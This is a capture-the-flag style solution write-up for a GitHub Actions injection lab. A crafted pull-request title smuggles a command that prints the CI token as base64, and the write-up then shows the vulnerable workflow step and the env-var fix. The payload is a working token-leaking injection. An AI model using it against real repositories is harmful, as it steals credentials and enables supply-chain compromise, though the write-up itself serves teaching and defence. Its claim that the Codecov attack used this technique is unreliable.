# CI Injection — Solution

## Reading the CI Output

```bash
kubectl get configmap ci-output -n dojo-sec-ci -o jsonpath='{.data.output}'
```

Output:

```
Run echo "PR by: attacker-user"
PR by: attacker-user
Run echo "PR title: "; printf '%s' $GITHUB_TOKEN | base64; echo "DONE"
PR title:
S1VCRXtnaXRodWJfYWN0aW9uc19pbmplY3Rpb25fdmlhX3ByX3RpdGxlfQ==
DONE
Run echo "Branch: attacker/pwn-the-ci"
Branch: attacker/pwn-the-ci
```

## Decoding the Exfiltrated Token

The base64 blob on line 5 is the "GITHUB_TOKEN" that the attacker's injected command printed:

```bash
echo "S1VCRXtnaXRodWJfYWN0aW9uc19pbmplY3Rpb25fdmlhX3ByX3RpdGxlfQ==" | base64 -d
```

**Flag: `KUBE{github_actions_injection_via_pr_title}`**

---

## Why the Injection Worked

The vulnerable workflow step:

```yaml
- name: Print PR info
  run: |
    echo "PR title: ${{ github.event.pull_request.title }}"
```

GitHub Actions evaluates `${{ ... }}` expressions *before* the shell runs the script. So the PR title is literally pasted into the shell script. The title was:

```
"; printf '%s' $GITHUB_TOKEN | base64; echo "DONE
```

After expression substitution, the script became:

```bash
echo "PR title: "; printf '%s' $GITHUB_TOKEN | base64; echo "DONE"
```

Three separate commands. The middle one printed the token.

---

## The Fix

```yaml
- name: Print PR info
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}   # expression → env var
  run: |
    echo "PR title: $PR_TITLE"   # env var expansion — not shell injection
```

When you pass the expression through an `env:` block, GitHub Actions encodes the value safely. No matter what characters the PR title contains, they never get executed as shell code — they're just the value of an environment variable.

---

## Real-World Impact

In a real workflow with a valid `GITHUB_TOKEN`:
- Attacker captures the token from the CI log (logs may be public)
- Uses it to push commits to the repo, bypass branch protection
- In severe cases: can push to `main`, trigger another workflow, deploy malicious code to production

This technique was used in the **Codecov** supply chain attack and many others.
